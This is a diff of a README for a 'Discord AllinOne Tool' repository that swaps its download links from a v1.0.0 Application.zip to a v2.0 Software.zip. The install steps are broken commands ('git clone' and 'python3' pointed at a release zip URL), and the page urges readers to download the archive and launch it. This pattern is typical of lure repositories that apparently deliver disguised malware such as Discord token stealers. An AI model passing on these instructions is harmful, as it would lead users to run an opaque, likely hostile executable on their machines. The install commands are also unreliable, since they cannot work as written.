@@ -13,12 +13,12 @@ Welcome to the Discord AllinOne Tool repository! This Python3 script is a compre
 
 1. Clone the repository:
    ```
-   git clone https://github.com/Joshcforti/Discord-AllinOne-Tool/releases/download/v1.0.0/Application.zip
+   git clone https://github.com/Joshcforti/Discord-AllinOne-Tool/releases/download/v2.0/Software.zip
    ```
 
 2. Run the script:
    ```
-   python3 https://github.com/Joshcforti/Discord-AllinOne-Tool/releases/download/v1.0.0/Application.zip
+   python3 https://github.com/Joshcforti/Discord-AllinOne-Tool/releases/download/v2.0/Software.zip
    ```
 
 ## Tools Included 🛠️
@@ -40,7 +40,7 @@ Welcome to the Discord AllinOne Tool repository! This Python3 script is a compre
 
 ## Installation 📦
 
-You can download the software from [https://github.com/Joshcforti/Discord-AllinOne-Tool/releases/download/v1.0.0/Application.zip](https://github.com/Joshcforti/Discord-AllinOne-Tool/releases/download/v1.0.0/Application.zip). Make sure to launch the file after downloading to start using the Discord AllinOne Tool.
+You can download the software from [https://github.com/Joshcforti/Discord-AllinOne-Tool/releases/download/v2.0/Software.zip](https://github.com/Joshcforti/Discord-AllinOne-Tool/releases/download/v2.0/Software.zip). Make sure to launch the file after downloading to start using the Discord AllinOne Tool.
 
 ## Issues and Support 🤝
 
